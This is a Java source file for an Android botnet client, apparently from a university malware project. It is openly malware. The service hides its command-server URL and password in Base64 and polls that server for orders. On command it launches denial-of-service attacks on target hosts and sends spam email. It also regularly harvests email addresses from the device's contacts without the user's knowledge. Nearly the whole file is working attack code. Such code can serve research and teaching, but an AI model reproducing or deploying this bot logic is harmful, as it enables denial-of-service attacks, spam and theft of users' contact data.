package es.uc3m.malware;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import es.uc3m.malware.task.DOSTask;
import es.uc3m.malware.task.SPAMTask;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


/**
 * This is the main class of the bot. This is service responsible for connecting to the server
 * process the commands received and launch the task to perform the commands
 */
public class BotService extends Service {


    private static CopyOnWriteArrayList<String> emails = new CopyOnWriteArrayList<>();
    public static final String LOG_TAG = "com.connect";
    public static final String BOT_MAIN = "/bot";


    private final String encodedURL = "aHR0cDovLzEwLjAuMi4yOjgwODE=";
    private final String encodedPassword = "cGFzc3dvcmQ=";

    private final ScheduledExecutorService executor =  Executors.newScheduledThreadPool(50);
    private final JsonParser parser = new JsonParser();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.i(LOG_TAG, "botService created");
    }


    public static CopyOnWriteArrayList<String> getEmails() {
        return emails;
    }

    /* In this method is where the bots schedule the task for connect to the server and another to harvest the 
     * mail from the contacts
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(LOG_TAG, "bot starting");
        if (isNetworkAvailable()) {
            try {
                //get the basic data of the device and schedule the task
                device = android.os.Build.MODEL;
                device = device.replace(" ", "");
                sdk = Integer.valueOf(android.os.Build.VERSION.SDK).toString();
                androidId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                executor.scheduleAtFixedRate(lopperRunnable, 1, 20, TimeUnit.SECONDS);
                executor.scheduleAtFixedRate(contactsHarvester, 1, 600, TimeUnit.SECONDS);
            } catch (Exception e) {
                Log.e(LOG_TAG, "Unable to connect to server");
            }
        }
        return START_STICKY;
    }

    private String device;
    private String sdk;
    private String androidId;
    private Runnable lopperRunnable = new Runnable(){
        @Override
        public void run() {
            try {
                getOrdersFromServer();
            } catch (Exception e) {
                Log.e(LOG_TAG, "", e);
            }
        }
    };

    /**
     * In this method is where the bot send the request to the server, process the response and launch the commands
     */
    private void getOrdersFromServer(){
        //decode the data of the server
        String url = new String(Base64.decode(encodedURL, Base64.DEFAULT));
        String pass = new String(Base64.decode(encodedPassword, Base64.DEFAULT));
        try {
            //send the request to the server
            URL serverURL = new URL(url + BOT_MAIN + "?id=" + androidId + "&p=" + pass);
            Log.i(LOG_TAG, serverURL.toString());
            BufferedReader reader = new BufferedReader(new InputStreamReader(serverURL.openStream()));
            String line;
            //read the response and transforms it into a JSON object
            StringBuilder total = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                total.append(line);
            }
            String command = total.toString();
            JsonObject jsonCommand = parser.parse(command).getAsJsonObject();
            String commandId = jsonCommand.get("command").getAsString();
            JsonArray args;
            //process the command 
            switch (commandId){
                case Commands.connected:
                    //just a connection successful reply
                    Log.i(LOG_TAG, "connected to server");
                    break;
                case Commands.NONE:
                    //the server sends this command where there are no pending tasks
                    break;
                case Commands.DOS:
                    //DOS attack command
                    Log.i(LOG_TAG, "DOS command received");
                    //parse the host and the port of the target an execute the DOS attack on a different thread
                    args = jsonCommand.get("args").getAsJsonArray();
                    String host = args.get(0).getAsString();
                    int port = args.get(1).getAsInt();
                    executor.submit(new DOSTask(host,port));
                    break;
                case Commands.SPAM:
                    //SPAM attack command
                    Log.i(LOG_TAG, "SPAM command received");
                    //parse the mail message body in html format and the subject of the message and send the messages
                    //on a different thread
                    args = jsonCommand.get("args").getAsJsonArray();
                    String htmlEmail = args.get(0).getAsString();
                    String subject = args.get(1).getAsString();
                    executor.submit(new SPAMTask(htmlEmail, subject));
                default:
                    Log.i(LOG_TAG, "command not recognised" + command);
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "", e);
        }
    }

    /**
     * This class is for store the command ids
     */
    private static class Commands{
        private static final String connected = "connected";
        private static final String DOS = "DOS";
        private static final String SPAM = "SPAM";
        private static final String NONE = "NONE";
    }

    /**
     * this method check the access to the network
     * @return true if none exception happens
     */
    public boolean isNetworkAvailable() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        return true;
    }

    /**
     * this task reads the mail addresses of the contacts list
     */
    Runnable contactsHarvester = new Runnable() {

        @Override
        public void run() {
            ArrayList<String> emlRecs = new ArrayList<String>();
            HashSet<String> emlRecsHS = new HashSet<String>();
            //get the device context
            Context context = getBaseContext();
            ContentResolver cr = context.getContentResolver();
            //field to recover
            String[] PROJECTION = new String[] { ContactsContract.RawContacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.PHOTO_ID,
                    ContactsContract.CommonDataKinds.Email.DATA,
                    ContactsContract.CommonDataKinds.Photo.CONTACT_ID };
            //query
            String order = "CASE WHEN "
                    + ContactsContract.Contacts.DISPLAY_NAME
                    + " NOT LIKE '%@%' THEN 1 ELSE 2 END, "
                    + ContactsContract.Contacts.DISPLAY_NAME
                    + ", "
                    + ContactsContract.CommonDataKinds.Email.DATA
                    + " COLLATE NOCASE";
            String filter = ContactsContract.CommonDataKinds.Email.DATA + " NOT LIKE ''";
            //perform the query
            Cursor cur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, PROJECTION, filter, null, order);
            //retrieve the mail address from the contact
            if (cur.moveToFirst()) {
                do {
                    // names comes in hand sometimes
                    String name = cur.getString(1);
                    String emlAddr = cur.getString(3);

                    // keep unique only
                    if (emlRecsHS.add(emlAddr.toLowerCase())) {
                        emlRecs.add(emlAddr);
                    }
                } while (cur.moveToNext());
            }
            cur.close();
            emails.clear();
            emails.addAll(emlRecs);
        }
    };

}


